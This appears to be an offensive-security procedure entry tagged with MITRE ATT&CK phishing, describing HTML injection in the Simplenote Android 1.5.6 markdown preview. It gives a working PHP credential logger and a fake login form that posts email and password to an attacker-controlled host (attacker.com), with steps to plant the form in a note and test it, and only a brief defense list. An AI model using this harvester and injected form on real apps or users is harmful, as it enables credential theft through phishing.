---
tags:
  - phishing
  - html-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Android
techniques:
  - '[[Phishing]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: bc6f5e9b-5150-4719-816a-65fe967205ac
created_at: '2025-12-14T17:24:42.449Z'
updated_at: '2025-12-14T17:24:42.449Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---
# Create-Malicious-Note-Containing-HTML-Form

## Summary

This procedure creates a Simplenote note with embedded HTML form code to enable phishing attacks by capturing user credentials upon rendering in preview mode.

## Description

In Simplenote Android version 1.5.6, user-input HTML is not sanitized during markdown preview, allowing arbitrary HTML tags like <form> and <input> to render and execute. An attacker crafts a note with a fake login form that submits data to a controlled server, tricking victims into entering sensitive information. This targets shared notes viewed on Android devices.

## Requirements

1. Simplenote Android app version 1.5.6 installed
2. Attacker server endpoint (e.g., PHP script to log POST data)
3. Basic HTML knowledge for form styling

## Defense

Defensive measures and detection strategies:

- Update to latest Simplenote version with HTML sanitization
- Disable preview mode or use markdown-only view
- Monitor network traffic for unexpected POSTs to external domains

## Objectives

1. Embed functional phishing form in note
2. Ensure form renders interactively in preview
3. Prepare for credential exfiltration

## Instructions

### Step 1: Set Up Attacker Endpoint

**Context**: Create a server to receive form submissions.

Use a simple PHP script on a hosted server:

```php
<?php
file_put_contents('credentials.txt', $_POST['email'] . ':' . $_POST['password'] . "\n", FILE_APPEND);
?>
```

> Deploy to https://attacker.com/login.php. Expected output: Logs victim data to file.

### Step 2: Craft HTML Form

**Context**: Build the malicious form HTML.

Insert into new Simplenote note:

```html
<form action="https://attacker.com/login.php" method="POST" style="border:1px solid #ccc; padding:20px;">
  <h2>Login</h2>
  <input type="email" name="email" placeholder="Email" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Login</button>
</form>
```

> Save note. In preview, form should appear styled and submit on click.

### Step 3: Verify Rendering

**Context**: Test in app preview.

Switch to preview mode in Simplenote. Interact with form.

> Expected: Form fields accept input; submission hits endpoint without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Phishing]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[html-injection]]
